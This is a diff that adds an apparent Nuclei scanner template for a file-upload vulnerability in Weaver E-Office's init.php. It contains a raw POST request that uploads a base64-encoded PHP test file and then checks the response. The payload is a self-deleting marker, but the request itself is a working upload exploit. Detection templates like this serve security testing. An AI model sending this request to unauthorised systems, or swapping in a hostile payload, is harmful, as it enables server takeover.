@@ -1,0 +1,38 @@
+id: eoffice_init_uploal
+info:
+  name: 泛微 E-Office init.php存在文件上传漏洞
+  author: mhb17
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: upload
+http:
+  - raw:
+      - |-
+        POST /E-mobile/App/init.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 170
+
+        m=common_Common_Flow&f=flowDo&diff=feedback&RUN_ID=1&USER_ID=1&CONTENT=1&FLOW_ID=1&upload_file=PD9waHAgZWNobyAiMTIzNDU2NzgiO3VubGluayhfX0ZJTEVfXyk7Pz4=&file_name=test.php
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - flag
+      - type: word
+        part: body
+        words:
+          - ?diff=
+      - type: word
+        part: body
+        words:
+          - test.php
+      - type: word
+        part: header
+        words:
+          - '200'
